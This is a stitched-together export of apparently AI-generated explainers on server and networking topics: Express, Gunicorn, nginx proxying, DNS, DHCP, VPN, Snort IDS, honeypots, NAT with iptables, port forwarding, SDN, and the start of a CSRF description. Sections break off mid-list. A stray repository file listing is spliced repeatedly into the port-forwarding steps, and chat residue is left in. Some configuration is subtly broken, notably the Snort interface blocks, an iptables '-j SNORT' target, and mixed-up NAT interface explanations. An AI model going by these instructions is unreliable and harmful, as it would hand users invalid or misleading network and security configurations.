Server, and be as broad or detail-oriented as you desire within your 
request. I eagerly await your next command!</p>

</ul>
<p><strong>4. Create Your Server:</strong></p>
<ul>
<li><strong>index.js:</strong> Create a file named <code>index.js</code> in your project directory. This file will contain your server code.</li>
<li><strong>Import modules:</strong> Start by importing the required modules:</li>
</ul>
<pre><code class="language-javascript">const express = require('express');
const app = express();
// Import any other modules needed
</code></pre>
<ul>
<li><strong>Define routes:</strong> </li>
</ul>
<ul>
<li>Use the <code>app.get()</code> method to define routes for handling different HTTP requests:</li>
</ul>
<pre><code class="language-javascript">app.get('/', (req, res) =\u003e {
 res.send('Hello from your Node.js server!');
});

app.get('/about', (req, res) =\u003e {
 res.send('This is the about page.');
});
</code></pre>
<ul>
<li>You can define routes for other HTTP methods like <code>POST</code>, <code>PUT</code>, and <code>DELETE</code> similarly.</li>
</ul>
<ul>
<li><strong>Handle requests:</strong></li>
</ul>
<ul>
<li>Inside the route handler functions, you can write your logic for handling the requests, including:</li>
<li>Reading data from the request body or query parameters.</li>
<li>Processing the data and performing any necessary operations.</li>
<li>Sending a response back to the client.</li>
</ul>
<p><strong>5. Start the Server:</strong></p>
<ul>
<li><strong>Run the server:</strong> Use the <code>app.listen()</code> method to start the server and listen for incoming connections on a specific port:</li>
</ul>
<pre><code class="language-javascript">const port = process.env.PORT || 3000;
app.listen(port, () =\u003e {
 console.log(`Server listening on port ${port}`);
});
</code></pre>
<p><strong>6. Test Your Server:</strong></p>
<ul>
<li>Open your web browser and navigate to <code>http://localhost:3000</code> (or the port you specified). You should see the response you defined in your route handler.</li>
</ul>
<p><strong>Additional Notes:</strong></p>
<ul>
<li>This is a basic example. You can build more complex applications by adding functionalities like user authentication, database interactions, and more.</li>
<li>Remember to replace placeholders like <code>// Your code here</code> with your actual logic.</li>
<li>Consult the official documentation for Express.js and other modules you use for more information and detailed examples.</li>

<h2 id="running-a-gunicorn-web-server"><a class="header" href="#running-a-gunicorn-web-server">Running a Gunicorn Web Server</a></h2>
<p>Gunicorn is a popular Python web server gateway interface (WSGI) HTTP server for Unix-like systems. It's known for its performance, efficiency, and ease of use. Here's how to run a Gunicorn web server:</p>
<p><strong>Prerequisites:</strong></p>
<ul>
<li>Python 3.6 or later</li>
<li>Gunicorn installed (<code>pip install gunicorn</code>)</li>
<li>Your WSGI application file (e.g., <code>app.py</code>)</li>
</ul>
<p><strong>Basic Usage:</strong></p>
<ol>
<li><strong>Navigate to your application directory:</strong> Open a terminal and navigate to the directory containing your WSGI application file.</li>
<li><strong>Run the Gunicorn command:</strong> Use the following command to start the Gunicorn server:</li>
</ol>
<pre><code class="language-bash">gunicorn app:app
</code></pre>
<p>This command tells Gunicorn to:</p>
<ul>
<li>Load the WSGI application defined in the <code>app</code> variable within the <code>app.py</code> file.</li>
<li>Start a single worker process by default.</li>
</ul>
<p><strong>Output:</strong></p>

</code></pre>
<p>This command starts the server:</p>
<ul>
<li>Listening on all interfaces (0.0.0.0) on port 8080.</li>
<li>Spawning 4 worker processes.</li>
<li>Using 2 threads per worker.</li>
<li>Setting the connection timeout to 60 seconds.</li>

Within the <code>http</code> block, you can define different server blocks for your proxy settings. A basic example:</li>
</ol>
<pre><code>server {
 listen 80;
 server_name example.com;

 location / {
 proxy_pass http://backend.example.com;
 proxy_set_header Host $host;
 proxy_set_header X-Real-IP $remote_addr;
 }
}
</code></pre>
<p>This configuration listens on port 80 for <code>example.com</code> and proxies all requests to <code>http://backend.example.com</code>.

<h2 id="what-is-a-dns-server"><a class="header" href="#what-is-a-dns-server">What is a DNS Server?</a></h2>
<p>A Domain Name System (DNS) server is a computer that translates human-readable domain names (like google.com) into machine-readable IP addresses (like 142.250.181.100). This translation process is essential for allowing devices to communicate with each other on the internet. </p>
<p>Here's an analogy: imagine the internet as a city and websites as houses within that city. Humans can easily remember and use house names like &quot;Smith residence&quot; or &quot;Johnson house,&quot; but for delivery trucks and postal services, they need the specific street addresses like &quot;123 Main Street&quot; or &quot;456 Elm Street.&quot; DNS servers act as the city's directory, translating human-friendly names (domain names) into their machine-readable addresses (IP addresses) to facilitate communication.</p>
<h2 id="how-does-a-dns-server-work"><a class="header" href="#how-does-a-dns-server-work">How does a DNS Server work?</a></h2>
<p>When you type a domain name into your browser, your computer sends a request to a DNS server. The DNS server then searches its database for the corresponding IP address and returns it to your computer. This process is typically very fast, taking only milliseconds.</p>
<p>Here's a breakdown of the process:</p>
<ol>
<li><strong>You type a domain name into your browser.</strong></li>
<li><strong>Your computer sends a DNS request to a DNS server.</strong> This request usually goes to your internet service provider's DNS server, but you can also configure your computer to use other DNS servers.</li>
<li><strong>The DNS server searches its database for the IP address associated with the domain name.</strong></li>
<li><strong>The DNS server returns the IP address to your computer.</strong></li>
<li><strong>Your computer uses the IP address to connect to the website.</strong></li>
</ol>
<h2 id="types-of-dns-servers"><a class="header" href="#types-of-dns-servers">Types of DNS Servers</a></h2>
<p>There are several types of DNS servers, each with its own function:</p>
<ul>
<li><strong>Recursive resolvers:</strong> These are the servers that typically handle requests from individual computers or devices. They receive requests, query other servers if necessary, and return the final IP address to the requesting device.</li>
<li><strong>Authoritative servers:</strong> These servers store the actual DNS records for specific domains. They receive queries from recursive resolvers and respond with the correct IP address for the requested domain.</li>
<li><strong>Root servers:</strong> These are the &quot;master&quot; servers that contain information about the location of specific domain's authoritative servers. Recursive resolvers query these servers first to find the appropriate authoritative server for the requested domain.</li>
</ul>
<h2 id="importance-of-dns-servers"><a class="header" href="#importance-of-dns-servers">Importance of DNS Servers</a></h2>
<p>DNS servers are essential for the proper functioning of the internet. Without them, it would be impossible to find and access websites by their domain names. They play a critical role in directing traffic and ensuring that users can connect to the websites they want to visit.</p>
<h2 id="final-note-1"><a class="header" href="#final-note-1">Final Note</a></h2>
<p>I hope this explanation provides a comprehensive understanding of DNS servers and their role in the internet. If you have any further questions, feel free to ask!</p>

<h2 id="understanding-the-dhcp-server-a-comprehensive-guide"><a class="header" href="#understanding-the-dhcp-server-a-comprehensive-guide">Understanding the DHCP Server: A Comprehensive Guide</a></h2>
<h3 id="introduction-13"><a class="header" href="#introduction-13">Introduction</a></h3>
<p>A Dynamic Host Configuration Protocol (DHCP) server is a critical network component responsible for automatically assigning IP addresses and other network configuration parameters to devices on a network. It simplifies network management by eliminating the need for manual configuration of each device's IP address, subnet mask, default gateway, and other settings. This improves efficiency, reduces errors, and facilitates centralized control over network configurations.</p>
<h3 id="functionality-3"><a class="header" href="#functionality-3">Functionality</a></h3>
<p>To understand how a DHCP server works, let's delve into its key functions:</p>
<ol>
<li><strong>Address Pool Management:</strong> </li>
</ol>
<ul>
<li>The DHCP server maintains a pool of available IP addresses within a specific range. </li>
<li>When a device requests an IP address, the server allocates an available address from the pool.</li>
<li>This ensures efficient utilization of IP addresses and prevents duplication.</li>
</ul>
<ol start="2">
<li><strong>Lease Management:</strong></li>
</ol>
<ul>
<li>DHCP leases define the duration for which a device can use an assigned IP address.</li>
<li>The server sets a lease time for each allocation after which the device must renew its lease.</li>
<li>This allows the server to reclaim unused addresses and reassign them to other devices.</li>
</ul>
<ol start="3">
<li><strong>Configuration Parameter Delivery:</strong></li>
</ol>
<ul>
<li>Beyond IP addresses, DHCP servers can provide additional network configuration parameters to devices.</li>
<li>This includes subnet masks, default gateways, DNS server addresses, and domain names.</li>
<li>By delivering these parameters, the server ensures consistent network settings across all devices.</li>
</ul>
<ol start="4">
<li><strong>Client Identification:</strong></li>
</ol>
<ul>
<li>DHCP relies on client identification mechanisms like MAC addresses to associate IP addresses with specific devices.</li>
<li>This enables the server to track leases and manage address allocation effectively.</li>
</ul>
<ol start="5">
<li><strong>Reservation and Exclusion:</strong></li>
</ol>
<ul>
<li>For critical devices requiring static IP addresses, the server allows reservation of specific addresses.</li>
<li>Additionally, specific devices can be excluded from receiving automatic IP assignments.</li>
</ul>
<h3 id="benefits-of-using-a-dhcp-server"><a class="header" href="#benefits-of-using-a-dhcp-server">Benefits of Using a DHCP Server</a></h3>
<p>Implementing a DHCP server offers numerous benefits:</p>
<ol>
<li><strong>Simplified Network Management:</strong> Automating IP address assignment significantly reduces manual configuration tasks, saving time and effort.</li>
<li><strong>Improved Efficiency:</strong> Centralized management of network configurations ensures consistency and minimizes errors.</li>
<li><strong>Flexibility:</strong> DHCP allows easy scaling of the network by accommodating new devices without manual configuration.</li>
<li><strong>Dynamic Addressing:</strong> DHCP enables efficient utilization of IP addresses by reclaiming unused addresses and reallocating them.</li>
<li><strong>Centralized Control:</strong> Network administrators have centralized control over network configurations, simplifying troubleshooting and policy enforcement.</li>
</ol>
<h3 id="conclusion-30"><a class="header" href="#conclusion-30">Conclusion</a></h3>

<h2 id="vpn-server-explanation-and-specifics"><a class="header" href="#vpn-server-explanation-and-specifics">VPN Server: Explanation and Specifics</a></h2>
<h2 id="what-is-a-vpn-server"><a class="header" href="#what-is-a-vpn-server">What is a VPN Server?</a></h2>
<p>A VPN server is a specialized type of computer that plays a crucial role in the operation of a virtual private network (VPN). The server acts as an intermediary between a user's device and the internet, enabling secure and private data transmission. </p>
<h3 id="key-functions"><a class="header" href="#key-functions">Key Functions:</a></h3>
<ul>
<li><strong>Encryption and Decryption:</strong> The VPN server encrypts user data before sending it over the public internet. This ensures secure transmission, even if someone intercepts the data packets. Upon reaching the user's device, the server decrypts the data, allowing them to access websites and online services securely.</li>
<li><strong>IP Address Masking:</strong> The VPN server assigns the user a new IP address, effectively anonymizing their online activities. This can be particularly beneficial for privacy-conscious individuals.</li>
<li><strong>Access Restriction:</strong> Some VPN servers restrict access to specific websites or online services. This feature can be valuable for overcoming censorship regulations or accessing region-locked content.</li>
<li><strong>Tunneling:</strong> The VPN server establishes a secure tunnel between the user's device and the server. This tunnel protects data from eavesdropping and interference.</li>
<li><strong>Remote Access:</strong> VPN servers allow authorized remote users access to a company's internal network. This facilitates secure communication and resource utilization for employees working outside the physical office.</li>
</ul>
<h2 id="specific-considerations-1"><a class="header" href="#specific-considerations-1">Specific Considerations:</a></h2>
<ul>
<li><strong>Server Location:</strong> The location of the VPN server impacts aspects such as speed, latency, and the availability of restricted content. Choosing servers closer to your physical location generally results in faster and smoother performance. Additionally, specific content may only be accessible through servers located in specific countries.</li>
<li><strong>Server Load:</strong> VPN server load, indicating how many concurrent users it serves, influences network performance. High load could result in slower speeds.</li>
<li><strong>Server Uptime:</strong> You want a VPN server with consistent uptime for reliable connectivity.</li>
<li><strong>Security and Encryption:</strong> Robust encryption and security protocols are paramount for secure data transmission. Look for strong and up-to-date encryption standards to ensure optimal protection.</li>
<li><strong>Features and Functionality:</strong> Depending on your needs, additional features like kill switches, DNS leak protection, and split tunneling might come in handy.</li>
</ul>
<h2 id="conclusion-47"><a class="header" href="#conclusion-47">Conclusion:</a></h2>
<p>A VPN server lies at the heart of the functionality and secure operation of a virtual private network. Its functions encompass encrypting and decrypting data, masking IP addresses, potentially offering access restriction, providing tunneling, and potentially facilitating remote access for authorized users. When selecting a VPN service, consider server location, server load, uptime, security and encryption standards, along with the features and functionality it offers to match your individual needs and preferences.</p>

<li><strong>Alerting and Logging:</strong> Generates alerts when suspicious activity is detected and logs events for further analysis.</li>
<li><strong>Response Actions:</strong> May automatically take actions to mitigate threats, such as blocking traffic or terminating connections.</li>
</ul>
<p><strong>Deployment:</strong></p>
<ul>
<li><strong>Inline deployment:</strong> The IDS server is placed directly in the network path, allowing it to actively block malicious traffic.</li>
<li><strong>Passive deployment:</strong> The IDS server monitors network traffic passively without interfering with data flow.</li>
</ul>
<p><strong>Types of IDS Servers:</strong></p>
<ul>
<li><strong>Network-based IDS (NIDS):</strong> Monitors network traffic for suspicious activity at the packet level.</li>
<li><strong>Host-based IDS (HIDS):</strong> Monitors individual hosts for malicious activity on the operating system level.</li>

<pre><code class="language-bash">sudo yum install snort
</code></pre>
<h2 id="configuration-7"><a class="header" href="#configuration-7">Configuration</a></h2>
<p>Once Snort is installed, you need to configure it. The main configuration file is located at <code>/etc/snort/snort.conf</code>.</p>
<h3 id="network-settings"><a class="header" href="#network-settings">Network settings</a></h3>
<p>First, specify your network interfaces in the <code>snort.conf</code> file. Identify the interface connected to your internal network and the one connected to the internet. For example:</p>
<pre><code>interface internal {
 # Network interface facing the internal network
 ipvar HOME_NET 192.168.1.0/24
}

interface external {
 # Network interface facing the internet
 ipvar EXTERNAL_NET any
}
</code></pre>
<h3 id="rule-sets"><a class="header" href="#rule-sets">Rule sets</a></h3>

<p>The most common way to include rule sets is using the &quot;include&quot; and &quot;source&quot; keywords in the <code>snort.conf</code> file. For example:</p>
<pre><code>include $RULE_PATH/emerging-attack.rules
include $RULE_PATH/emerging-compromised.rules
</code></pre>
<h3 id="inline-mode-configuration"><a class="header" href="#inline-mode-configuration">Inline mode configuration</a></h3>
<p>Inline mode allows Snort to analyze and block network traffic in real-time. For this, define the interfaces on which Snort will listen and modify the network configuration to route traffic through Snort.</p>
<p><strong>Step 1:</strong> Configure the snort.conf file with the following options:</p>
<pre><code>snort_dynamicengine 1
var ET_DEBUG 0
ipvar ET_HOME_NET 192.168.1.0/24
ipvar ET_EXTERNAL_NET 0.0.0.0/0
var EXTERNAL_NET 0.0.0.0/0
var HOME_NET 192.168.1.0/24
var INGRESS_VLAN \&quot;internal\&quot;
var EGRESS_VLAN \&quot;external\&quot;
</code></pre>
<p><strong>Step 2:</strong> Modify iptables rules:</p>
<pre><code class="language-bash">iptables -I FORWARD 1 -i $INGRESS_VLAN -o $EGRESS_VLAN -j SNORT

iptables -I FORWARD 1 -i $EGRESS_VLAN -o $INGRESS_VLAN -j SNORT

iptables -t nat -A PREROUTING -i $EXTERNAL_NET -j SNAT --to-source $INGRESS_IP
</code></pre>
<p><strong>Step 3:</strong> Restart Snort and iptables services:</p>
<pre><code class="language-bash">service snort restart
service iptables save

<h2 id="honeypot-server-explained-a-detailed-look"><a class="header" href="#honeypot-server-explained-a-detailed-look">Honeypot Server Explained: A Detailed Look</a></h2>
<p>A honeypot server is essentially a decoy computer system, strategically designed to lure and entrap cyber attackers. Acting as a sacrificial lamb in the digital world, its primary goal is to gather valuable intel on the hackers' techniques, tools, and motives, ultimately bolstering an organization's overall cybersecurity posture. Let's delve deeper into how a honeypot server operates:</p>
<p><strong>Types of Honeypot Servers:</strong></p>
<p>There are two main types of honeypot servers:</p>
<ul>
<li><strong>Low-interaction honeypots:</strong> These are relatively simple systems that offer limited functionality, often mimicking services like FTP, SSH, or Telnet servers. While they can effectively capture basic information about attacks, their lack of complexity restricts the depth of insights they can provide.</li>
<li><strong>High-interaction honeypots:</strong> Compared to their low-interaction counterparts, these honeypots are meticulously designed to mimic real-world production systems. This allows them to gather more intricate data on attacker behavior as they delve deeper into the simulated environment. However, this added complexity comes at a cost, requiring more resources and expertise to set up and maintain.</li>
</ul>
<p><strong>Deployment Strategies:</strong></p>
<p>Honeypot servers can be deployed in two primary modes:</p>
<ul>
<li><strong>Internal:</strong> Placed within your organization's internal network, these honeypots focus on identifying and analyzing attacks originating from inside the network, potentially from malicious insiders or compromised systems.</li>
<li><strong>External:</strong> Deployed on a public-facing IP address outside your network, these honeypots serve as bait for external attackers seeking to infiltrate your systems. This configuration allows you to observe attacker tactics and tools without exposing your actual production systems to potential harm.</li>
</ul>
<p><strong>Benefits of Implementing Honeypot Servers:</strong></p>
<p>The benefits of deploying honeypot servers are multifaceted:</p>
<ul>
<li><strong>Gaining Insights into Attacker Behavior:</strong> This is the core purpose of a honeypot, enabling organizations to learn about the latest attack methods, the tools hackers use, and their overall objectives. By analyzing this data, security teams can better anticipate and counter real-world attacks.</li>
<li><strong>Understanding Attack Motivations:</strong> Delving into the data captured by a honeypot can reveal whether attackers target specific systems or are motivated by financial gain, espionage, or disruption. This knowledge aids in formulating targeted defense strategies, focusing resources on areas of greatest risk.</li>
<li><strong>Improving Detection Capabilities:</strong> As you learn about attacker tactics, you can refine your intrusion detection and prevention systems to flag suspicious activity more effectively. Additionally, honeypots can be configured to interact with attackers, feeding false information to distract them, or keeping them occupied while genuine security issues are addressed.</li>
<li><strong>Early Warning System:</strong> Honeypots, particularly those deployed externally, act as a canary in the coal mine, detecting and alerting your security team to attack attempts before they can damage your critical systems. This early notification window is crucial in mitigating the potential impact of cyberattacks.</li>
</ul>
<p><strong>Deployment Considerations:</strong></p>
<p>Before deploying a honeypot server, there are some key aspects to consider:</p>
<ul>
<li><strong>Legality:</strong> Ensure compliance with relevant laws and regulations in your jurisdiction.</li>
<li><strong>Ethical Implications:</strong> Clearly define what actions your honeypot takes in response to attackers, balancing intelligence gathering with potential legal repercussions.</li>
<li><strong>Resource Requirements:</strong> Factor in the costs associated with setup, maintenance, and security monitoring of your honeypot environment.</li>
<li><strong>Integration with Existing Security Infrastructure:</strong> Integrate your honeypot data with existing security information and event management (SIEM) tools to enhance analysis and threat response capabilities.</li>
</ul>
<p>If you require specific recommendations on honeypot server software or deployment strategies tailored to your organizational needs, don't hesitate to provide additional information about your environment and risk profile. I would be happy to guide you in choosing the most suitable approach.</p>
<p>In conclusion, honeypot servers provide a valuable layer of defense in the ever-evolving cybersecurity landscape. By strategically using them to gather intel on attacker behavior, organizations can gain invaluable insights, improve security practices, and proactively protect their critical assets.</p>

<h2 id="network-address-translation-nat-server"><a class="header" href="#network-address-translation-nat-server">Network Address Translation (NAT) Server:</a></h2>
<p><strong>Concept:</strong></p>
<p>A Network Address Translation (NAT) server acts as an intermediary between private IP addresses on a local network and public IP addresses on the internet. It allows multiple devices on a private network to share a single public IP address while also masking their individual private IP addresses for security purposes.</p>
<p><strong>Functionalities:</strong></p>
<ul>
<li><strong>Translates private IP addresses to public IP addresses:</strong> When a device on the private network attempts to connect to the internet, the NAT server replaces its private IP address with a public IP address. This allows the device to communicate with external networks.</li>
<li><strong>Port forwarding:</strong> Allows specific incoming traffic to be directed to specific devices on the private network based on port numbers. This is useful for applications like online gaming and remote access.</li>
<li><strong>Network Address Port Translation (NAPT):</strong> A specific type of NAT that allows multiple devices on the private network to use the same public IP address by assigning them different port numbers.</li>
<li><strong>Firewall functionality:</strong> Some NAT servers include basic firewall features to filter incoming and outgoing traffic, providing an additional layer of security.</li>
</ul>
<p><strong>Common Applications:</strong></p>
<ul>
<li><strong>Home networks:</strong> Sharing a single internet connection with multiple devices like computers, smartphones, and smart TVs.</li>
<li><strong>Small businesses:</strong> Connecting multiple computers and other devices to the internet while maintaining security.</li>
<li><strong>Public Wi-Fi hotspots:</strong> Allowing users to connect to the internet without exposing their individual IP addresses.</li>
</ul>
<p><strong>Types of NAT Servers:</strong></p>
<ul>
<li><strong>Static NAT:</strong> Assigns a fixed public IP address to a specific private IP address.</li>
<li><strong>Dynamic NAT:</strong> Assigns a public IP address from a pool of available addresses to a private IP address on demand.</li>
<li><strong>Port Address Translation (PAT):</strong> A type of dynamic NAT that uses port numbers to differentiate between multiple devices using the same public IP address.</li>
</ul>
<p><strong>Benefits:</strong></p>
<ul>
<li><strong>Conserves public IP addresses:</strong> Allows multiple devices to share a single public IP address, saving valuable resources.</li>
<li><strong>Enhances security:</strong> Hides individual private IP addresses from external networks, providing an additional layer of security.</li>
<li><strong>Simplifies network management:</strong> Allows easier administration of network devices and connections.</li>
</ul>
<p><strong>Considerations:</strong></p>
<ul>
<li><strong>Port forwarding complexity:</strong> Setting up port forwarding rules can be complex for non-technical users.</li>
<li><strong>Limited control over public IP address:</strong> Dynamic NAT users may not have control over the specific public IP address assigned to them.</li>
<li><strong>Potential performance impact:</strong> NAT can impact network performance in certain scenarios, especially with high traffic loads. </li>

<h3 id="introduction-21"><a class="header" href="#introduction-21">Introduction</a></h3>
<p>Network Address Translation (NAT) allows multiple private devices on a network to share a single public IP address. This guide explores how to configure a NAT server using iptables on Linux systems. We'll cover the key concepts, setup steps, and practical examples for various scenarios.</p>
<h3 id="prerequisites-1"><a class="header" href="#prerequisites-1">Prerequisites</a></h3>
<p>Before we begin, ensure you have the following:</p>
<ul>
<li>A Linux system with internet connectivity.</li>
<li>Root or sudo privileges.</li>
<li>Basic understanding of iptables commands and network concepts.</li>
</ul>
<h3 id="understanding-nat"><a class="header" href="#understanding-nat">Understanding NAT</a></h3>
<p>NAT operates by translating the private IP addresses of internal devices to the public IP address of the NAT server when they initiate outbound connections. This hides the internal network structure while providing internet access to all devices.</p>
<p>There are three main types of NAT:</p>
<ol>
<li><strong>Static NAT:</strong> Maps a private IP address to a specific public IP address on a one-to-one basis.</li>
<li><strong>Dynamic NAT:</strong> Assigns private IP addresses to public IP addresses from a pool on demand.</li>
<li><strong>Port Address Translation (PAT):</strong> Uses a single public IP address for multiple private devices by translating both the IP address and port number for each connection.</li>
</ol>
<h3 id="setting-up-iptables-nat-server"><a class="header" href="#setting-up-iptables-nat-server">Setting Up iptables NAT Server</a></h3>
<p>Follow these steps to configure your Linux system as a NAT server using iptables:</p>
<ol>
<li><strong>Enable IP forwarding:</strong> Edit the <code>/etc/sysctl.conf</code> file and set <code>net.ipv4.ip_forward=1</code>. Then, run <code>sysctl -p</code> to apply the changes.</li>
<li><strong>Set up iptables rules:</strong> </li>
</ol>
<p>Here's an example configuration for PAT:</p>
<pre><code>iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i eth0 -o eth1 -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
iptables -A FORWARD -i eth1 -o eth0 -m state --state ESTABLISHED,RELATED -j ACCEPT
</code></pre>
<p><strong>Explanation:</strong></p>
<ul>
<li>The first rule translates the source IP address of outgoing packets on the eth0 interface (public) to the NAT server's public IP address using MASQUERADE.</li>
<li>The second rule allows new and established connections from the eth0 interface to the eth1 interface (private network).</li>
<li>The third rule allows established and related connections from the eth1 interface to the eth0 interface.</li>
</ul>
<ol start="3">
<li><strong>Save and load iptables rules:</strong> Use <code>iptables-save \u003e /etc/iptables/rules.v4</code> to save the rules and <code>iptables-restore \u003c /etc/iptables/rules.v4</code> to load them automatically on system boot.</li>
</ol>
<h3 id="additional-configurations"><a class="header" href="#additional-configurations">Additional Configurations</a></h3>
<p><strong>Static NAT:</strong></p>
<p>To configure static NAT, replace the MASQUERADE target with SNAT, followed by the private and public IP addresses. For example:</p>
<pre><code>iptables -t nat -A POSTROUTING -o eth0 -j SNAT --to-source 192.168.1.100
</code></pre>
<p><strong>Port Forwarding:</strong></p>
<p>For specific applications, you can forward incoming connections to specific ports on a private device. Use the DNAT target with the desired protocol, port numbers, and private IP address. Example:</p>
<pre><code>iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 8080 -j DNAT --to-destination 192.168.1.10:80
</code></pre>
<h3 id="testing-and-troubleshooting"><a class="header" href="#testing-and-troubleshooting">Testing and Troubleshooting</a></h3>
<p>After setting up the NAT server, test its functionality. You can use tools like ping and traceroute to verify connectivity from private devices to external hosts. Additionally, check the iptables logs for any errors or dropped packets.</p>
<h3 id="conclusion-61"><a class="header" href="#conclusion-61">Conclusion</a></h3>
<p>This guide provided a comprehensive overview of setting up a NAT server using iptables. Remember to customize the configuration based on your specific network setup and security needs. Continuously monitoring and adjusting your firewall rules will ensure a secure and efficient NAT environment.</p>

<h2 id="what-is-port-forwarding"><a class="header" href="#what-is-port-forwarding">What is Port Forwarding</a></h2>
<p>Port forwarding is used to allow incoming connections on a specific network port to be directed to a specific device on a private network. In simpler terms, port forwarding creates a tunnel from the public internet to an internal device on a private network, typically behind a router and NAT firewall. This is necessary because a NAT firewall only allows outbound connections by default, preventing external devices from initiating connections to internal devices.</p>

<p>Network Address Translation (NAT) enables multiple devices on a private network to share a single public IP address, allowing them to communicate with the internet. However, NAT also introduces a layer of security, as external devices cannot directly access internal devices on the local network.</p>
<h2 id="setting-up-port-forwarding-on-a-nat-router"><a class="header" href="#setting-up-port-forwarding-on-a-nat-router">Setting up Port Forwarding on a NAT Router</a></h2>
<p>Here are the specific steps on how to set up port forwarding on a NAT router:</p>
<p><strong>1. Access the Router Interface:</strong></p>
<ul>
<li>Log in to the router's web interface using a web browser. The router's web address and login credentials can be found in its user manual.</li>
<li>Alternatively, you might be able to access the router interface through a mobile app, though the interface options might be limited.</li>
</ul>
<p><strong>2. Find the Port Forwarding Section:</strong></p>
<ul>
<li>The location of the Port Forwarding setting varies across router models but is typically found under sections labeled &quot;Port Forwarding,&quot; &quot;NAT&quot;, &quot;Virtual Servers,&quot; &quot;Gaming,&quot; or a similar variation.</li>
</ul>
<p><strong>3. Create a New Rule:</strong></p>
<ul>
<li>Click on the option to add a new port forwarding rule.</li>
<li>Enter the following information:
LICENSE README.md go.mod go.sum lol.rb main.go prompt-response prompt-subject run-prompt-subject.rb <strong>Service Name:</strong> A name for the rule (e.g., &quot;Gaming PC&quot;)
LICENSE README.md go.mod go.sum lol.rb main.go prompt-response prompt-subject run-prompt-subject.rb <strong>Protocol:</strong> The type of traffic (e.g., TCP, UDP) used by the application.
LICENSE README.md go.mod go.sum lol.rb main.go prompt-response prompt-subject run-prompt-subject.rb <strong>External Port:</strong> The port number that will be used on the public internet.
LICENSE README.md go.mod go.sum lol.rb main.go prompt-response prompt-subject run-prompt-subject.rb <strong>Internal Port:</strong> The port number used by the application on the internal device. This might be the same as the external port or different depending on the application's configuration.
LICENSE README.md go.mod go.sum lol.rb main.go prompt-response prompt-subject run-prompt-subject.rb <strong>Internal IP Address:</strong> The private IP address of the device that you want to access from the internet. You can usually find the IP address of the device in its network settings or through the DHCP client list in the router interface.</li>
</ul>
<p><strong>4. Save and Enable the Rule.</strong></p>
<ul>
<li>Click &quot;Save,&quot; &quot;Apply,&quot; or a similar option to activate the port forwarding rule.</li>
<li>Ensure that the rule you created is enabled and not disabled.</li>
</ul>
<h2 id="additional-notes-8"><a class="header" href="#additional-notes-8">Additional Notes:</a></h2>
<ul>
<li>Some applications require specific port ranges to function properly. In such cases, you will need to forward the entire range of ports instead of a single port.</li>
<li>If you encounter difficulties setting up port forwarding, consult your router’s user manual or contact your internet service provider for assistance.</li>
<li>It’s important to only forward the ports that are needed for specific applications or services, and to disable port forwarding when not in use. This helps improve the security of your network.</li>
<li>Be aware that port forwarding can introduce security vulnerabilities if not implemented correctly. Ensure you have adequate security measures in place on the device you are forwarding ports to.</li>

<h2 id="sdn-server-an-overview"><a class="header" href="#sdn-server-an-overview">SDN Server: An Overview</a></h2>
<p>While the term &quot;SDN Server&quot; doesn't represent a specific type of server in the traditional sense, it encompasses the concept of a central entity responsible for managing and controlling network resources within an SDN (Software-Defined Networking) environment. This central entity, often referred to as an <strong>SDN controller</strong> or <strong>SDN management system</strong>, can be implemented as a dedicated server or utilize the capabilities of a regular server to perform its functions. </p>
<p>Let's explore the different aspects of an SDN Server:</p>
<p><strong>1. Functions:</strong></p>
<ul>
<li><strong>Centralized Network Management:</strong> The SDN server acts as a central point for managing network devices like switches, routers, and firewalls. It configures, monitors, and controls these devices based on policies and application requirements.</li>
<li><strong>Policy Configuration:</strong> The SDN server defines and implements policies that govern network behavior. These policies could be based on security requirements, quality of service (QoS) levels, or specific application needs.</li>
<li><strong>Forwarding Rules:</strong> The SDN server calculates and distributes forwarding rules to network devices. These rules determine how network traffic should be routed across the network.</li>
<li><strong>Abstraction:</strong> The SDN server hides the underlying network complexity from applications and users, providing a simplified and unified view of the network.</li>
<li><strong>Automation:</strong> The SDN server automates network configuration and management tasks, reducing manual intervention and improving operational efficiency.</li>
<li><strong>Dynamic Control:</strong> The SDN server allows for dynamic adjustments to network settings in response to changing network conditions or application needs.</li>
</ul>
<p><strong>2. Implementation:</strong></p>
<ul>
<li><strong>Dedicated Hardware:</strong> In some cases, the SDN server may be implemented on dedicated hardware specifically designed for high-performance networking tasks. This provides advantages in terms of scalability and processing power.</li>
<li><strong>Virtualization:</strong> Often, the SDN server is implemented as a software application that can run on a virtual machine or containerized environment. This offers flexibility and resource optimization.</li>
<li><strong>Distributed Architecture:</strong> In larger networks, the SDN server functionality may be distributed across multiple physical or virtual servers, improving fault tolerance and scalability.</li>
</ul>
<p><strong>3. OpenFlow and Other Protocols:</strong></p>
<ul>
<li>The SDN server typically relies on protocols like OpenFlow to communicate with network devices and program their forwarding behavior. OpenFlow allows the server to install and update forwarding rules dynamically.</li>
<li>Other protocols used by SDN servers may include NETCONF and REST APIs for configuration and management purposes.</li>
</ul>
<p><strong>4. Benefits:</strong></p>
<ul>
<li><strong>Flexibility:</strong> SDN servers enable dynamic and programmable network control, making it easier to adapt to changing requirements and application demands.</li>
<li><strong>Agility:</strong> SDN facilitates rapid service provisioning and network reconfiguration, increasing operational agility.</li>
<li><strong>Scalability:</strong> SDN allows for flexible scaling of network resources to accommodate growing network traffic and user demands.</li>
<li><strong>Efficiency:</strong> SDN automates network tasks, minimizing manual configuration and management overhead, leading to improved operational efficiency.</li>
<li><strong>Security:</strong> SDN allows for centralized security policy enforcement and monitoring, enhancing network security posture.</li>
</ul>
<p><strong>5. Examples:</strong></p>
<ul>
<li>OpenDaylight</li>
<li>Floodlight</li>
<li>Ryu</li>
<li>ONOS</li>
<li>VMware NSX</li>

<div style="break-before: page; page-break-before: always;"></div><p>Here's the translation of &quot;ataki typu csrf&quot; into English:</p>
<p><strong>Cross-Site Request Forgery (CSRF)</strong></p>
<p>Cross-Site Request Forgery, often abbreviated as CSRF, is a type of web security attack that exploits a user's existing, authenticated session on a trusted website to perform unauthorized actions. Attackers trick the victim's browser into sending unwanted requests to the trusted website, often resulting in actions the user didn't intend or authorize.</p>
<p><strong>How CSRF Attacks Work:</strong></p>
<ol>
<li><strong>Target Website:</strong> Attackers target a website where the victim has an active login session with valid cookies or authentication tokens.</li>
<li><strong>Malicious Link or Form:</strong> The attacker creates a malicious link or form embedded in an email, social media post, or website.</li>
<li><strong>Unaware Request:</strong> When the victim clicks the link or submits the form, their browser automatically sends a request to the targeted website along with their valid session cookies or tokens.</li>
